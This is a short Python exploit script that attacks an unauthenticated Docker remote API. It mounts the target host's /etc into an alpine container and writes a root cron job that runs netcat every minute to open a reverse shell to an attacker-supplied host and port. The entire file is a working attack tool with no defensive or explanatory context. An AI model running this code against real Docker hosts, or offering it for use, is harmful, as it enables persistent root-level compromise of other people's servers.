# -*- coding: utf-8 -*-
# author: seven
import argparse
import docker


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="used docker unauth rce")
    parser.add_argument('--lhost', required=True, help='specify local host')
    parser.add_argument('--lport', required=True, help='specify local port')
    parser.add_argument(
        "url", help="sepcify target,example: http://127.0.0.1:2375")
    args = parser.parse_args()
    cmd = f'''sh -c "echo '* * * * * /usr/bin/nc {args.lhost} {args.lport} -e /bin/sh' >> /tmp/etc/crontabs/root" '''
    try:
        client = docker.DockerClient(base_url=args.url)
        
        client.containers.run('alpine:latest', cmd,remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
    except Exception as e:
        print(str(e))
